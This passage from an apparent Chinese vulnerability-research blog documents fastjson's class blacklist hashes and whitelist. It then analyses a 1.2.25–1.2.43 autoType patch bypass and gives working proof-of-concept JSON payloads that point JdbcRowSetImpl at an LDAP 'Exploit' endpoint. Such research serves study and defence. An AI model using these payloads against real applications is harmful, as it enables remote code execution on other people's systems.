4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td>java.lang.UNIXProcess</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td>org.codehaus.jackson.</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td><td>org.apache.commons.proxy.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr><tr><td>1.2.66</td><td>-2439930098895578154</td><td>0xde23a0809a8b9bd6L</td><td>javax.script.</td></tr><tr><td>1.2.66</td><td>-582813228520337988</td><td>0xf7e96e74dfa58dbcL</td><td>javax.sound.</td></tr><tr><td>1.2.66</td><td>-26639035867733124</td><td>0xffa15bf021f1e37cL</td><td>javax.print.</td></tr><tr><td>1.2.66</td><td>386461436234701831</td><td>0x55cfca0f2281c07L</td><td>javax.activation.</td></tr><tr><td>1.2.66</td><td>1153291637701043748</td><td>0x100150a253996624L</td><td>javax.tools.</td></tr><tr><td>1.2.66</td><td>1698504441317515818L</td><td>0x17924cca5227622aL</td><td>javax.management.</td></tr><tr><td>1.2.66</td><td>7375862386996623731L</td><td>0x665c53c311193973L</td><td>org.apache.xbean.</td></tr><tr><td>1.2.66</td><td>7658177784286215602L</td><td>0x6a47501ebb2afdb2L</td><td>org.eclipse.jetty.</td></tr><tr><td>1.2.66</td><td>8055461369741094911L</td><td>0x6fcabf6fa54cafffL</td><td>javax.naming.</td></tr><tr><td>1.2.67</td><td>-7775351613326101303L</td><td>0x941866e73beff4c9L</td><td>org.apache.shiro.realm.</td></tr><tr><td>1.2.67</td><td>-6025144546313590215L</td><td>0xac6262f52c98aa39L</td><td>org.apache.http.conn.</td></tr><tr><td>1.2.67</td><td>-5939269048541779808L</td><td>0xad937a449831e8a0L</td><td>org.quartz.</td></tr><tr><td>1.2.67</td><td>-5885964883385605994L</td><td>0xae50da1fad60a096L</td><td>com.taobao.eagleeye.wrapper</td></tr><tr><td>1.2.67</td><td>-3975378478825053783L</td><td>0xc8d49e5601e661a9L</td><td>org.apache.http.impl.</td></tr><tr><td>1.2.67</td><td>-2378990704010641148L</td><td>0xdefc208f237d4104L</td><td>com.ibatis.</td></tr><tr><td>1.2.67</td><td>-905177026366752536L</td><td>0xf3702a4a5490b8e8L</td><td>org.apache.catalina.</td></tr><tr><td>1.2.67</td><td>2660670623866180977L</td><td>0x24ec99d5e7dc5571L</td><td>org.apache.http.auth.</td></tr><tr><td>1.2.67</td><td>2731823439467737506L</td><td>0x25e962f1c28f71a2L</td><td>br.com.anteros.</td></tr><tr><td>1.2.67</td><td>3637939656440441093L</td><td>0x327c8ed7c8706905L</td><td>com.caucho.</td></tr><tr><td>1.2.67</td><td>4254584350247334433L</td><td>0x3b0b51ecbf6db221L</td><td>org.apache.http.cookie.</td></tr><tr><td>1.2.67</td><td>5274044858141538265L</td><td>0x49312bdafb0077d9L</td><td>org.javasimon.</td></tr><tr><td>1.2.67</td><td>5474268165959054640L</td><td>0x4bf881e49d37f530L</td><td>org.apache.cocoon.</td></tr><tr><td>1.2.67</td><td>5596129856135573697L</td><td>0x4da972745feb30c1L</td><td>org.apache.activemq.jms.pool.</td></tr><tr><td>1.2.67</td><td>6854854816081053523L</td><td>0x5f215622fb630753L</td><td>org.mortbay.jetty.</td></tr><tr><td>1.2.68</td><td>-3077205613010077203L</td><td>0xd54b91cc77b239edL</td><td>org.apache.shiro.jndi.</td></tr><tr><td>1.2.68</td><td>-2825378362173150292L</td><td>0xd8ca3d595e982bacL</td><td>org.apache.ignite.cache.jta.</td></tr><tr><td>1.2.68</td><td>2078113382421334967L</td><td>0x1cd6f11c6a358bb7L</td><td>javax.swing.J</td></tr><tr><td>1.2.68</td><td>6007332606592876737L</td><td>0x535e552d6f9700c1L</td><td>org.aoju.bus.proxy.provider.</td></tr><tr><td>1.2.68</td><td>9140390920032557669L</td><td>0x7ed9311d28bf1a65L</td><td>java.awt.p</td></tr><tr><td>1.2.68</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.69</td><td>-8024746738719829346L</td><td>0x90a25f5baa21529eL</td><td>java.io.Serializable</td></tr><tr><td>1.2.69</td><td>-5811778396720452501L</td><td>0xaf586a571e302c6bL</td><td>java.io.Closeable</td></tr><tr><td>1.2.69</td><td>-3053747177772160511L</td><td>0xd59ee91f0b09ea01L</td><td>oracle.jms.AQ</td></tr><tr><td>1.2.69</td><td>-2114196234051346931L</td><td>0xe2a8ddba03e69e0dL</td><td>java.util.Collection</td></tr><tr><td>1.2.69</td><td>-2027296626235911549L</td><td>0xe3dd9875a2dc5283L</td><td>java.lang.Iterable</td></tr><tr><td>1.2.69</td><td>-2939497380989775398L</td><td>0xd734ceb4c3e9d1daL</td><td>java.lang.Object</td></tr><tr><td>1.2.69</td><td>-1368967840069965882L</td><td>0xed007300a7b227c6L</td><td>java.lang.AutoCloseable</td></tr><tr><td>1.2.69</td><td>2980334044947851925L</td><td>0x295c4605fd1eaa95L</td><td>java.lang.Readable</td></tr><tr><td>1.2.69</td><td>3247277300971823414L</td><td>0x2d10a5801b9d6136L</td><td>java.lang.Cloneable</td></tr><tr><td>1.2.69</td><td>5183404141909004468L</td><td>0x47ef269aadc650b4L</td><td>java.lang.Runnable</td></tr><tr><td>1.2.69</td><td>7222019943667248779L</td><td>0x6439c4dff712ae8bL</td><td>java.util.EventListener</td></tr><tr><td>1.2.70</td><td>-5076846148177416215L</td><td>0xb98b6b5396932fe9L</td><td>org.apache.commons.collections4.Transformer</td></tr><tr><td>1.2.70</td><td>-4703320437989596122L</td><td>0xbeba72fb1ccba426L</td><td>org.apache.commons.collections4.functors</td></tr><tr><td>1.2.70</td><td>-4314457471973557243L</td><td>0xc41ff7c9c87c7c05L</td><td>org.jdom2.transform.</td></tr><tr><td>1.2.70</td><td>-2533039401923731906L</td><td>0xdcd8d615a6449e3eL</td><td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td></tr><tr><td>1.2.70</td><td>156405680656087946L</td><td>0x22baa234c5bfb8aL</td><td>com.p6spy.engine.</td></tr><tr><td>1.2.70</td><td>1214780596910349029L</td><td>0x10dbc48446e0dae5L</td><td>org.apache.activemq.pool.</td></tr><tr><td>1.2.70</td><td>3085473968517218653L</td><td>0x2ad1ce3a112f015dL</td><td>org.apache.aries.transaction.</td></tr><tr><td>1.2.70</td><td>3129395579983849527L</td><td>0x2b6dd8b3229d6837L</td><td>org.apache.activemq.ActiveMQConnectionFactory</td></tr><tr><td>1.2.70</td><td>4241163808635564644L</td><td>0x3adba40367f73264L</td><td>org.apache.activemq.spring.</td></tr><tr><td>1.2.70</td><td>7240293012336844478L</td><td>0x647ab0224e149ebeL</td><td>org.apache.activemq.ActiveMQXAConnectionFactory</td></tr><tr><td>1.2.70</td><td>7347653049056829645L</td><td>0x65f81b84c1d920cdL</td><td>org.apache.commons.jelly.</td></tr><tr><td>1.2.70</td><td>7617522210483516279L</td><td>0x69b6e0175084b377L</td><td>org.apache.axis2.transport.jms.</td></tr><tr><td>1.2.71</td><td>-4537258998789938600L</td><td>0xc1086afae32e6258L</td><td>java.io.FileReader</td></tr><tr><td>1.2.71</td><td>-4150995715611818742L</td><td>0xc664b363baca050aL</td><td>java.io.ObjectInputStream</td></tr><tr><td>1.2.71</td><td>-2995060141064716555L</td><td>0xd66f68ab92e7fef5L</td><td>java.io.FileInputStream</td></tr><tr><td>1.2.71</td><td>-965955008570215305L</td><td>0xf2983d099d29b477L</td><td>java.io.ObjectOutputStream</td></tr><tr><td>1.2.71</td><td>-219577392946377768L</td><td>0xfcf3e78644b98bd8L</td><td>java.io.DataOutputStream</td></tr><tr><td>1.2.71</td><td>2622551729063269307L</td><td>x24652ce717e713bbL</td><td>java.io.PrintWriter</td></tr><tr><td>1.2.71</td><td>2930861374593775110L</td><td>0x28ac82e44e933606L</td><td>java.io.Buffered</td></tr><tr><td>1.2.71</td><td>4000049462512838776L</td><td>0x378307cb0111e878L</td><td>java.io.InputStreamReader</td></tr><tr><td>1.2.71</td><td>4193204392725694463L</td><td>0x3a31412dbb05c7ffL</td><td>java.io.OutputStreamWriter</td></tr><tr><td>1.2.71</td><td>5545425291794704408L</td><td>0x4cf54eec05e3e818L</td><td>java.io.FileWriter</td></tr><tr><td>1.2.71</td><td>6584624952928234050L</td><td>0x5b6149820275ea42L</td><td>java.io.FileOutputStream</td></tr><tr><td>1.2.71</td><td>7045245923763966215L</td><td>0x61c5bdd721385107L</td><td>java.io.DataInputStream</td></tr><tr><td>1.2.83</td><td>-8754006975464705441L</td><td>0x868385095a22725fL</td><td>org.apache.commons.io.</td></tr><tr><td>1.2.83</td><td>-8382625455832334425L</td><td>0x8baaee8f9bf77fa7L</td><td>org.mvel2.</td></tr><tr><td>1.2.83</td><td>-6088208984980396913L</td><td>0xab82562f53e6e48fL</td><td>kotlin.reflect.</td></tr><tr><td>1.2.83</td><td>-4733542790109620528L</td><td>0xbe4f13e96a6796d0L</td><td>com.googlecode.aviator.</td></tr><tr><td>1.2.83</td><td>-1363634950764737555L</td><td>0xed13653cb45c4bedL</td><td>org.aspectj.</td></tr><tr><td>1.2.83</td><td>-803541446955902575L</td><td>0xf4d93f4fb3e3d991L</td><td>org.dom4j.</td></tr><tr><td>1.2.83</td><td>860052378298585747L</td><td>0xbef8514d0b79293L</td><td>org.apache.commons.cli.</td></tr><tr><td>1.2.83</td><td>1268707909007641340L</td><td>0x119b5b1f10210afcL</td><td>com.google.common.eventbus.</td></tr><tr><td>1.2.83</td><td>3058452313624178956L</td><td>0x2a71ce2cc40a710cL</td><td>org.thymeleaf.</td></tr><tr><td>1.2.83</td><td>3740226159580918099L</td><td>0x33e7f3e02571b153L</td><td>org.junit.</td></tr><tr><td>1.2.83</td><td>3977090344859527316L</td><td>0x37317698dcfce894L</td><td>org.mockito.asm.</td></tr><tr><td>1.2.83</td><td>4319304524795015394L</td><td>0x3bf14094a524f0e2L</td><td>com.google.common.io.</td></tr><tr><td>1.2.83</td><td>5120543992130540564L</td><td>0x470fd3a18bb39414L</td><td>org.mockito.runners.</td></tr><tr><td>1.2.83</td><td>5916409771425455946L</td><td>0x521b4f573376df4aL</td><td>org.mockito.cglib.</td></tr><tr><td>1.2.83</td><td>6090377589998869205L</td><td>0x54855e265fe1dad5L</td><td>com.google.common.reflect.</td></tr><tr><td>1.2.83</td><td>7164889056054194741L</td><td>0x636ecca2a131b235L</td><td>org.mockito.stubbing.</td></tr><tr><td>1.2.83</td><td>8711531061028787095L</td><td>0x78e5935826671397L</td><td>org.apache.commons.codec.</td></tr><tr><td>1.2.83</td><td>8735538376409180149L</td><td>0x793addded7a967f5L</td><td>ognl.</td></tr><tr><td>1.2.83</td><td>8861402923078831179L</td><td>0x7afa070241b8cc4bL</td><td>com.google.common.util.concurrent.</td></tr><tr><td>1.2.83</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.83</td><td>9144212112462101475L</td><td>0x7ee6c477da20bbe3L</td><td>com.google.common.net.</td></tr></tbody></table><h3 id="目前未知的列表" tabindex="-1"><a class="header-anchor" href="#目前未知的列表"><span>目前未知的列表</span></a></h3><table><thead><tr><th style="text-align:left;">version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td style="text-align:left;">1.2.42</td><td>33238344207745342</td><td>0x761619136cc13eL</td><td></td></tr><tr><td style="text-align:left;">1.2.67</td><td>-831789045734283466L</td><td>0xf474e44518f26736L</td><td></td></tr><tr><td style="text-align:left;">1.2.71</td><td>3452379460455804429L</td><td>0x2fe950d3ea52ae0dL</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-8614556368991373401L</td><td>0x8872f29fd0b0b7a7L</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-5472097725414717105L</td><td>0xb40f341c746ec94fL</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-3750763034362895579L</td><td>0xcbf29ce484222325L</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-1800035667138631116L</td><td>0xe704fd19052b2a34L</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-831789045734283466L</td><td>0xf474e44518f26736L</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>33238344207745342L</td><td>0x761619136cc13eL</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>3452379460455804429L</td><td>0x2fe950d3ea52ae0dL</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>4215053018660518963L</td><td>0x3a7ee0635eb2bc33L</td><td></td></tr><tr><td style="text-align:left;">1.2.83</td><td>-8614556368991373401L</td><td>0x8872f29fd0b0b7a7L</td><td></td></tr><tr><td style="text-align:left;">1.2.83</td><td>-3750763034362895579L</td><td>0xcbf29ce484222325L</td><td></td></tr><tr><td style="text-align:left;">1.2.83</td><td>-1800035667138631116L</td><td>0xe704fd19052b2a34L</td><td></td></tr><tr><td style="text-align:left;">1.2.83</td><td>4215053018660518963L</td><td>0x3a7ee0635eb2bc33L</td><td></td></tr></tbody></table><h3 id="内置白名单" tabindex="-1"><a class="header-anchor" href="#内置白名单"><span>内置白名单</span></a></h3>',5),U=(0,s.Lk)("code",null,"fastjson",-1),G={href:"https://github.com/alibaba/fastjson/commit/84eca8e56003ff6ebad3da19c6d69dcd842dbdf7",target:"_blank",rel:"noopener noreferrer"},X=(0,s.Fv)('<p>PS: <code>org.springframework.security.web.savedrequest.DefaultSavedRequest</code>​ 在该次 commit 中从白名单移除。</p><table><thead><tr><th>hash</th><th>name</th></tr></thead><tbody><tr><td>0xD4788669A13AE74L</td><td>java.awt.Rectangle</td></tr><tr><td>0xE08EE874A26F5EAFL</td><td>java.awt.Point</td></tr><tr><td>0xDDAAA11FECA77B5EL</td><td>java.awt.Font</td></tr><tr><td>0xB81BA299273D4E6L</td><td>java.awt.Color</td></tr><tr><td>0xA8AAA929446FFCE4L</td><td>com.alibaba.fastjson.util.AntiCollisionHashMap</td></tr><tr><td>0xD0E71A6E155603C1L</td><td>com.alipay.sofa.rpc.core.exception.SofaTimeOutException</td></tr><tr><td>0x9F2E20FB6049A371L</td><td>java.util.Collections.UnmodifiableMap</td></tr><tr><td>0xD45D6F8C9017FAL</td><td>java.util.concurrent.ConcurrentSkipListMap</td></tr><tr><td>0x64DC636F343516DCL</td><td>java.util.concurrent.ConcurrentSkipListSet</td></tr><tr><td>0x7FE2B8E675DA0CEFL</td><td>org.springframework.dao.CannotAcquireLockException</td></tr><tr><td>0xF8C7EF9B13231FB6L</td><td>org.springframework.dao.CannotSerializeTransactionException</td></tr><tr><td>0x42646E60EC7E5189L</td><td>org.springframework.dao.CleanupFailureDataAccessException</td></tr><tr><td>0xCC720543DC5E7090L</td><td>org.springframework.dao.ConcurrencyFailureException</td></tr><tr><td>0xC0FE32B8DC897DE9L</td><td>org.springframework.dao.DataAccessResourceFailureException</td></tr><tr><td>0xDC9583F0087CC2C7L</td><td>org.springframework.dao.DataIntegrityViolationException</td></tr><tr><td>0x5449EC9B0280B9EFL</td><td>org.springframework.dao.DataRetrievalFailureException</td></tr><tr><td>0xEB7D4786C473368DL</td><td>org.springframework.dao.DeadlockLoserDataAccessException</td></tr><tr><td>0x44D57A1B1EF53451L</td><td>org.springframework.dao.DuplicateKeyException</td></tr><tr><td>0xC92D8F9129AF339BL</td><td>org.springframework.dao.EmptyResultDataAccessException</td></tr><tr><td>0x9DF9341F0C76702L</td><td>org.springframework.dao.IncorrectResultSizeDataAccessException</td></tr><tr><td>0xDB7BFFC197369352L</td><td>org.springframework.dao.IncorrectUpdateSemanticsDataAccessException</td></tr><tr><td>0x73FBA1E41C4C3553L</td><td>org.springframework.dao.InvalidDataAccessApiUsageException</td></tr><tr><td>0x76566C052E83815L</td><td>org.springframework.dao.InvalidDataAccessResourceUsageException</td></tr><tr><td>0x61D10AF54471E5DEL</td><td>org.springframework.dao.NonTransientDataAccessException</td></tr><tr><td>0x82E8E13016B73F9EL</td><td>org.springframework.dao.NonTransientDataAccessResourceException</td></tr><tr><td>0xE794F5F7DCD3AC85L</td><td>org.springframework.dao.OptimisticLockingFailureException</td></tr><tr><td>0x3F64BC3933A6A2DFL</td><td>org.springframework.dao.PermissionDeniedDataAccessException</td></tr><tr><td>0x863D2DD1E82B9ED9L</td><td>org.springframework.dao.PessimisticLockingFailureException</td></tr><tr><td>0x4BB3C59964A2FC50L</td><td>org.springframework.dao.QueryTimeoutException</td></tr><tr><td>0x552D9FB02FFC9DEFL</td><td>org.springframework.dao.RecoverableDataAccessException</td></tr><tr><td>0x21082DFBF63FBCC1L</td><td>org.springframework.dao.TransientDataAccessException</td></tr><tr><td>0x178B0E2DC3AE9FE5L</td><td>org.springframework.dao.TransientDataAccessResourceException</td></tr><tr><td>0x24AE2D07FB5D7497L</td><td>org.springframework.dao.TypeMismatchDataAccessException</td></tr><tr><td>0x90003416F28ACD89L</td><td>org.springframework.dao.UncategorizedDataAccessException</td></tr><tr><td>0x73A0BE903F2BCBF4L</td><td>org.springframework.jdbc.BadSqlGrammarException</td></tr><tr><td>0x7B606F16A261E1E6L</td><td>org.springframework.jdbc.CannotGetJdbcConnectionException</td></tr><tr><td>0xAFCB539973CEA3F7L</td><td>org.springframework.jdbc.IncorrectResultSetColumnCountException</td></tr><tr><td>0x4A39C6C7ACB6AA18L</td><td>org.springframework.jdbc.InvalidResultSetAccessException</td></tr><tr><td>0x9E404E583F254FD4L</td><td>org.springframework.jdbc.JdbcUpdateAffectedIncorrectNumberOfRowsException</td></tr><tr><td>0x34CC8E52316FA0CBL</td><td>org.springframework.jdbc.LobRetrievalFailureException</td></tr><tr><td>0xB5114C70135C4538L</td><td>org.springframework.jdbc.SQLWarningException</td></tr><tr><td>0x7F36112F218143B6L</td><td>org.springframework.jdbc.UncategorizedSQLException</td></tr><tr><td>0x26C5D923AF21E2E1L</td><td>org.springframework.cache.support.NullValue</td></tr><tr><td>0xD11D2A941337A7BCL</td><td>org.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken</td></tr><tr><td>0x4F0C3688E8A18F9FL</td><td>org.springframework.security.oauth2.common.DefaultOAuth2AccessToken</td></tr><tr><td>0xC59AA84D9A94C640L</td><td>org.springframework.security.oauth2.common.DefaultOAuth2RefreshToken</td></tr><tr><td>0x1F10A70EE4065963L</td><td>org.springframework.util.LinkedMultiValueMap</td></tr><tr><td>0x557F642131553498L</td><td>org.springframework.util.LinkedCaseInsensitiveMap</td></tr><tr><td>0x8B2081CB3A50BD44L</td><td>org.springframework.remoting.support.RemoteInvocation</td></tr><tr><td>0x8B2081CB3A50BD44L</td><td>org.springframework.remoting.support.RemoteInvocation</td></tr><tr><td>0x54DC66A59269BAE1L</td><td>org.springframework.security.web.savedrequest.SavedCookie</td></tr><tr><td>0x111D12921C5466DAL</td><td>org.springframework.security.web.csrf.DefaultCsrfToken</td></tr><tr><td>0x19DCAF4ADC37D6D4L</td><td>org.springframework.security.web.authentication.WebAuthenticationDetails</td></tr><tr><td>0x604D6657082C1EE9L</td><td>org.springframework.security.core.context.SecurityContextImpl</td></tr><tr><td>0xF4AA683928027CDAL</td><td>org.springframework.security.authentication.UsernamePasswordAuthenticationToken</td></tr><tr><td>0x92F252C398C02946L</td><td>org.springframework.security.core.authority.SimpleGrantedAuthority</td></tr><tr><td>0x6B949CE6C2FE009L</td><td>org.springframework.security.core.userdetails.User</td></tr></tbody></table><h2 id="_1-2-25-1-2-43-补丁绕过" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-43-补丁绕过"><span>1.2.25 - 1.2.43 补丁绕过</span></a></h2><h3 id="调试分析-1" tabindex="-1"><a class="header-anchor" href="#调试分析-1"><span>调试分析</span></a></h3><p>修改 fastjson 的版本为 <code>1.2.43</code>​，运行上面的 poc 进行查看，报错 autoType is not support. LLcom.sun.rowset.JdbcRowSetImpl;; 调试看看，修改的是直接对类名以 &quot;<code>LL</code>​&quot; 开头的直接报错。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">BASIC</span> <span class="token operator">=</span> <span class="token number">0</span>xcbf29ce484222325L<span class="token punctuation">;</span>\n<span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">PRIME</span> <span class="token operator">=</span> <span class="token number">0</span>x100000001b3L<span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><h3 id="绕过利用-1" tabindex="-1"><a class="header-anchor" href="#绕过利用-1"><span>绕过利用</span></a></h3><p>那能不能用上面提到的 <code>[</code>​ 来进行 绕过呢？先用 <code>[</code>​ 来进行绕过试试，poc 如下。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;[com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;, \\&quot;autoCommit\\&quot;:true}&quot;</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>提示格式错误，看来还得调试一下。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>exepct <span class="token char">&#39;[&#39;</span><span class="token punctuation">,</span> but <span class="token punctuation">,</span><span class="token punctuation">,</span> pos <span class="token number">42</span><span class="token punctuation">,</span> json <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功走到了 <code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>​。</p><p>​<img src="'+f+'" alt="image" loading="lazy">​</p><p>​<img src="'+x+'" alt="image" loading="lazy">​</p><p>​<img src="'+L+'" alt="image" loading="lazy">​</p><p>‍</p><p>证明类是正常加载了，返回的 <code>clazz</code>​ 如上所示，是在 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>​ 最后反序列的时候出错。</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p><p>按照错误提示进行修改，根据错误提示信息 exepct &#39;<code>[</code>​&#39;, but <code>,</code>​, pos 42，JSON 解析器期望在位置 42 处找到一个 <code>[</code>​ 符号，但是实际上找到了一个逗号 <code>,</code>​。</p><p>​<img src="'+j+'" alt="image" loading="lazy">​</p><p>那就按它的期望在 <code>,</code>​ 的位置添加一个 <code>[</code>​ 咯，修改运行。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;[com.sun.rowset.JdbcRowSetImpl\\&quot;[,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;, \\&quot;autoCommit\\&quot;:true}&quot;</span><span class="token punctuation">;</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>报错</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>syntax error<span class="token punctuation">,</span> expect <span class="token punctuation">{</span><span class="token punctuation">,</span> actual string<span class="token punctuation">,</span> pos <span class="token number">43</span><span class="token punctuation">,</span> fastjson<span class="token operator">-</span>version <span class="token number">1.2</span><span class="token number">.43</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>好，继续修改添加，最终 poc 如下成功绕过。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;[com.sun.rowset.JdbcRowSetImpl\\&quot;[{,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;, \\&quot;autoCommit\\&quot;:true}&quot;</span><span class="token punctuation">;</span>\n\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><p>‍</p><p><strong>原因：</strong> 在反序列化中，调用了 <code>DefaultJSONParser.parseArray()</code>​ 函数来解析数组内容，其中会有一些 if 判断语句校验后面的字符内容是否为 &quot;<code>[</code>​&quot;、&quot;<code>{</code>​&quot; 等，前面一开始尝试的几个 payload 报错的原因正是出在这里。</p><p>​<code>com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:675)</code>​</p><p>​<img src="'+C+'" alt="image" loading="lazy">​</p><p>​<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:451)</code>​</p><p>​<img src="'+w+'" alt="image" loading="lazy">​</p><h2 id="_1-2-25-1-2-45-补丁绕过" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-45-补丁绕过"><span>1.2.25 - 1.2.45 补丁绕过</span></a></h2><h3 id="调试分析-2" tabindex="-1"><a class="header-anchor" href="#调试分析-2"><span>调试分析</span></a></h3><p>修改 fastjson 的版本为 